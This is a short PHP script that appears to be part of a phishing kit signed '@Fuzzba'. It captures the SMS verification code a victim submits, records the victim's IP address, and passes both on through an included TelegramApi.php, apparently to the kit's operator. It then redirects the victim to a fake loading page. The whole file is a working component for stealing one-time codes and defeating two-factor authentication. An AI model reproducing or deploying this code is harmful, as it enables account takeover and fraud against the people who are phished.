<?php
/**
 * @telegram   :   @Fuzzba 
 * Author      :   Fuzzba 
 */
session_start();


$InfoDATE   = date("d-m-Y h:i:sa");
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 


$sms_code = $_SESSION['sms_code'] = $_POST['sms_code'];




$hexor = '@Fuzzba
sms2: '.$_SESSION["sms_code"].' 
ip: '.$_SERVER['REMOTE_ADDR'].' 
';






include("TelegramApi.php"); 



header('Location: ../loading2.php');


?>


